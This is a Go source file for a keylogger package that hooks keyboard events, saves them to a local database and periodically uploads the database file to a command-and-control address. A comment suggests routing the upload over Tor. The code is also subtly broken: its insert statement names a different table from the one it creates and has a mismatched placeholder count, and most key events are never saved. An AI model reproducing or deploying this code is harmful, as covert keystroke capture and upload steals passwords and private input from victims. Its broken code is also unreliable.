package keylogger

import (
	"bufio"
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"

	hook "github.com/robotn/gohook"
)

func SaveEvent(db *sql.DB, e hook.Event) (sql.Result, error) {
	return db.Exec(`INSERT INTO eventos (kind,rawcode,button,x,y,clicks,amount,rotation,direction,when) values (?,?,?,?,?,?,?,?,?)`, e.Kind, e.Rawcode, e.Button, e.X, e.Y, e.Clicks, e.Amount, e.Rotation, e.Direction, e.When)
}

func CreateTable(db *sql.DB) {
	db.Exec(`CREATE TABLE IF NOT EXISTS events(
		id INT AUTOINCREMENT,
		when DATETIME,
		kind INT,
		rawcode INT,
		button INT,
		x INT,
		y INT,
		clicks INT,
		amount INT,
		rotation INT,
		direction INT
	)`)
}

const cc = "http://localhost:5050"

func PostToCC(cc, db string) { // tip: use bine to torify this
	f, err := os.OpenFile(db, os.O_RDONLY, os.FileMode(0666))
	if err != nil {
		fmt.Print("oops")
	}
	defer f.Close()
	resp, err := http.Post(cc, "Content-Type: binary/octet-stream", bufio.NewReader(f))
	if err != nil {
		log.Println(err)
	}
	log.Println(resp.Status, resp.Body)
}

func RunHook(db *sql.DB, ev chan hook.Event, tick chan time.Time) {
	for {
		select {
		case e := <-ev:
			switch e.Kind {
			case hook.KeyDown:
			case hook.KeyUp:
			case hook.KeyHold:
				SaveEvent(db, e)
			default:
				break
			}
		case <-tick:
			PostToCC(cc, "./db.db")
		}
	}
}
